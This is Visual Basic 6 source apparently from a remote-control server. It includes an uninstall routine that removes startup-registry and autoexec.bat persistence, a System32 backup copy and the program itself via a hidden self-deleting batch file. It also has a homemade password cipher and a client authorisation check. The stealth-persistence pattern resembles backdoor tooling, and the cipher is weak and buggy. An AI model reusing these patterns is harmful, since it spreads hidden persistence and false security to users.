Public Function cBoolSng(iBoolean As Boolean) As Single
Select Case iBoolean
Case True
    cBoolSng = 1
Case False
    cBoolSng = 0
End Select
End Function

Public Function cSngBool(iSingle As Single) As Boolean
Select Case iSingle
Case 0
    cSngBool = False
Case 1
    cSngBool = True
End Select
End Function

Sub Uninstall(Filename As String)
Dim WindowsDir As String, DriveRoot As String, AutoExecData As String, LineData As String
Dim CompletePath As String, ComleteName As String

WindowsDir = Environ("WINDIR")
DriveRoot = Environ("HOMEDRIVE") & "\"

If modMain.GetDirectory(Filename) = Filename Then
    CompletePath = WindowsDir & "\System32\" & Filename
    ComleteName = Filename
Else
    CompletePath = modMain.GetDirectory(Filename)
    ComleteName = SimplifyFile(Filename)
End If

'Stop RemoteControl from running on startup
DeleteKey HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\" & FileNoExtention(ComleteName)

'Scan Autoexec.bat for RemoteControl's backup line
If Dir(DriveRoot & "autoexec.bat") <> "" Then
    
    Open DriveRoot & "autoexec.bat" For Input As #1
    Do Until EOF(1)
        Line Input #1, LineData
        If InStr(1, LCase(LineData), CompletePath) = 0 Then AutoExecData = AutoExecData & LineData & vbCrLf
    Loop
    Close #1
    
    'Save Autoexec without RemoteControl backup.
    Open DriveRoot & "Autoexec.bat" For Output As #1
    Print #1, AutoExecData
    Close #1
End If

'Kill the backup copy
If Dir(WindowsDir & "\System32\BACKUP.bak") <> "" Then
    Kill WindowsDir & "\System32\BACKUP.bak"
End If

'And now, finaly, delete the actual program
Open App.Path & "\temp.bat" For Output As #1
Print #1, "echo off"
Print #1, "erase "; Chr(34); AppPath; Chr(34)
Print #1, "erase temp.bat"
Close #1

VBA.Shell App.Path & "\temp.bat", vbHide
End
End Sub

Function Encrypt(ByVal strPassword As String, ByRef ByteArray() As Byte) As Byte()
    Dim PasswordVal As Long, PasswordVal2 As Long, CurrentChar As Long, CurrentMod As Long
    Dim TempArray() As Byte
    On Error Resume Next
    
    ReDim TempArray(LBound(ByteArray) To UBound(ByteArray))
    'Lets turn our password into a number! Yippee!
    PasswordVal = GetPasswordValue(strPassword)
    PasswordVal2 = GetPasswordValue2(strPassword)
    
    'CurrentMod will makes it difficult to recognise when we use the same character more than once.
    'CurrentMod = WrapNumber(CalculateSeed(WrapNumber(PasswordVal, 0, 360)), 0, 360)
    
    For i = LBound(ByteArray) To UBound(ByteArray)
        CurrentChar = ByteArray(i)
        'Set currentchar as the ASCII value of the the character being encrypted
        CurrentChar = CurrentChar - PasswordVal
        CurrentChar = CurrentChar + PasswordVal2
        CurrentChar = CurrentChar - CalculateSeed(WrapNumber(CLng(i), 1, 360), PasswordVal2)
        'CurrentMod is passed into CalculateSeed - See that function for more details.
        'CurrentChar = CurrentChar - CalculateSeed(CLng(CurrentMod))
                
        CurrentChar = WrapNumber(CurrentChar, 0, 255)
        
        TempArray(i) = CurrentChar
        
        CurrentMod = CurrentMod + 1
        If CurrentMod > 30 Then CurrentMod = 2
    Next i
    
    Encrypt = TempArray()
    
End Function

Function Decrypt(strPassword As String, strInput() As Byte) As Byte()
    Dim PasswordVal As Long, PasswordVal2 As Long, CurrentChar As Long
    Dim TempArray() As Byte
    
    'Lets turn our password into a number! Yippee!
    PasswordVal = GetPasswordValue(strPassword)
    PasswordVal2 = GetPasswordValue2(strPassword)
    
    ReDim TempArray(LBound(strInput) To UBound(strInput))
    
    For i = LBound(strInput) To UBound(strInput)
        CurrentChar = strInput(i)
        'Set currentchar as the ASCII value of the the character being encrypted
        CurrentChar = CurrentChar + CalculateSeed(WrapNumber(CLng(i), 1, 360), PasswordVal2)
        CurrentChar = CurrentChar - PasswordVal2
        CurrentChar = CurrentChar + PasswordVal
       
        'CurrentMod is passed into CalculateSeed - See that function for more details.
        'CurrentChar = CurrentChar + CalculateSeed(CLng(CurrentMod))
        
        'We need to make sure that CurrentChar ends up being between 0 and 255, so we wrap it!
        CurrentChar = WrapNumber(CurrentChar, 0, 255)
        
        TempArray(i) = CurrentChar
        
        'Add 1 to CurrentMod (For calculated randomization)
    Next i
    
    Decrypt = TempArray()
End Function

Private Function GetPasswordValue(strPassword As String) As Long
    Dim ASCII_Vals As Long
    
    For i = 1 To Len(strPassword)
        'We need to add up all the ASCII values from all the characters
        ASCII_Vals = ASCII_Vals + Asc(Mid(strPassword, i, 1))
    Next i
    
    GetPasswordValue = Int(CalculateSeed(ASCII_Vals, Len(strPassword) + 1))

End Function

Private Function GetPasswordValue2(strPassword As String) As Long
    Dim ASCII_Vals As Long
    
    For i = 1 To Len(strPassword)
        'We need to add up all the ASCII values from all the characters
        ASCII_Vals = ASCII_Vals + Asc(Mid(strPassword, i, 1))
    Next i
    
    GetPasswordValue2 = ASCII_Vals * Len(strPassword)
    
    GetPasswordValue2 = WrapNumber(GetPasswordValue2, 0, 255)
    
End Function

Private Function CalculateSeed(InputNumber As Long, Multiplier As Long) As Long
    'This functions pretty much makes the InputNumber appear to become a totally random
    'number, but unke using rnd (Random Function) this will always return the same number
    'as long as you enter the same number.
    
    'Log and Cos are just Maths functions
    CalculateSeed = Int(Sin(InputNumber) * Cos(InputNumber) * Multiplier)

End Function

Private Function WrapNumber(lngNumber As Long, lngMinimum As Long, lngMaximum As Long) As Long
    Dim Range As Long
    
    Range = lngMaximum - lngMinimum + 1
    
    WrapNumber = lngNumber - (Int((lngNumber - lngMinimum) / Range) * Range)
End Function

Public Function GetAuthorisation()
    Authorised = False
    
    Randomize Timer
    OriginalAuthorisationString = modMain.GenerateRandomCharacters(10 + Rnd(1) * 30)
    EncryptAuthorisationString = StrConv(modMain.Encrypt(Password, StrConv(OriginalAuthorisationString, vbFromUnicode)), vbUnicode)
    
    Send "authorisation;" & modMain.CorrectReservedChars(EncryptAuthorisationString)
End Function

Public Function CheeckAuthorisation(AuthCode As String)
    If AuthCode = OriginalAuthorisationString Then
        Authorised = True
        Send "response;You're authorised to control this server."
        Debug.Print Password
    Else
        Send "response;Invalid password, access denied. Reconnect to retry."
    End If
        
End Function
